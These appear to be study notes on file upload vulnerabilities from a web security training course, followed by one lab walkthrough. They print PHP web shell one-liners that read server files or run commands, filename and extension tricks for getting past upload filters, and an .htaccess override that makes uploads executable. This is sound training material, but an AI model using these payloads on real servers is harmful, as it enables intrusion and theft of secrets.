# File Upload Vulnerabilities

[Portswigger](https://portswigger.net/web-security/file-upload#what-are-file-upload-vulnerabilities)

## Methodology

Hint: The Content-Type response header may provide clues as to what kind of file the server thinks it has served. If this header hasn't been explicitly set by the application code, it normally contains the result of the file extension/MIME type mapping

the following PHP one-liner could be used to read arbitrary files from the server's filesystem `<?php echo file_get_contents('/path/to/target/file'); ?>` 
or `<?php echo system($_GET['command']); ?>` 

### Flawed file input type validation

Example HTML form request:

```
POST /images HTTP/1.1
    Host: normal-website.com
    Content-Length: 12345
    Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="image"; filename="example.jpg"
    Content-Type: image/jpeg

    [...binary content of example.jpg...]

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="description"

    This is an interesting description of my image.

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="username"

    wiener
    ---------------------------012345678901234567890123456--
```

if input validation only applies to the first part of the `form-data` you can change the data types and get execution like that, notice the two different `Content-Type`s above

### Preventing file execution in user-accessible directories

As a precaution, servers generally only run scripts whose MIME type they have been explicitly configured to execute. Otherwise, they may just return some kind of error message or, in some cases, serve the contents of the file as plain text instead

Tip: Web servers often use the filename field in multipart/form-data requests to determine the name and location where the file should be saved

### Insufficient blacklisting of dangerous file types

Such blacklists can sometimes be bypassed by using lesser known, alternative file extensions that may still be executable, such as .php5, .shtml, and so on

### Overriding the server configuration

you may occasionally find servers that fail to stop you from uploading your own malicious configuration file. In this case, even if the file extension you need is blacklisted, you may be able to trick the server into mapping an arbitrary, custom file extension to an executable MIME type. 

examples:

Apache added as `.htaccess`

```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
    AddType application/x-httpd-php .php
```

IIS added as web.config

```
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
    </staticContent>
```

### Obfuscating file extensions

steps to obfuscate

- case sensitive bypassing like `exploit.pHp`
- provide multiple extensions `exploit.php.jpg`
- add trailing characters `exploit.php.`
- try using URL encoding, or double URL encoding for dots, forward slashes, and backward slashes `exploit%2Ephp`
  - If the value isn't decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked
- Add semicolons or URL-encoded null byte characters before the file extension `exploit.asp;.jpg` or `exploit.asp%00.jpg`
- try using multibyte unicode characters which may be converted to null bytes and dots after unicode conversion or normalization like: `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E` if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path
- other defenses may strip or replace dangerous extensions, do this to maybe avoid: `exploit.p.phphp`

### Flawed validation of the file's contents

Instead of implicitly trusting the Content-Type specified in a request, more secure servers try to verify that the contents of the file actually match what is expected

certain file types may always contain a specific sequence of bytes in their header or footer. These can be used like a fingerprint or signature to determine whether the contents match the expected type. For example, JPEG files always begin with the bytes `FF D8 FF`

This is a much more robust way of validating the file type, but even this isn't foolproof. Using special tools, such as ExifTool, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata

### Exploiting file upload vulnerabilities without remote code execution

**Uploading malicious client-side scripts**

if you can upload HTML files or SVG images, you can potentially use <script> tags to create stored XSS payloads

**Exploiting vulnerabilities in the parsing of uploaded files**

example, you know that the server parses XML-based files, such as Microsoft Office `.doc` or `.xls` files, this may be a potential vector for XXE injection attacks

### Uploading files using PUT

some web servers may be configured to support PUT requests, this can provide an alternative means of uploading malicious files, even when an upload function isn't available via the web interface

Tip: You can try sending OPTIONS requests to different endpoints to test for any that advertise support for the PUT method.

## Labs walkthrough

### Remote code execution via web shell upload

Background: 

```
This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter 
```

- log into your account, notice the option for uploading an avatar image
- upload an arbitrary image and notice that afterwards your preview of your avatar is now displayed on the page
- in `Proxy > HTTP history` click the filter bar to open the `HTTP history filter` window, under the `Filter by MIME type` enable the `images` checkbox then apply the changes
- no in burp history search for the `GET` request to `/files/avatars/<YOUR-IMAGE>` and send it to repeater
- now on your system create a file called exploit.php containing this: `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- use the avatar upload functionality to upload the above file, then in the repeater tab change the path to `GET /files/avatars/exploit.php HTTP/1.1` and send
- you will now have carlos' secret in the response

### 































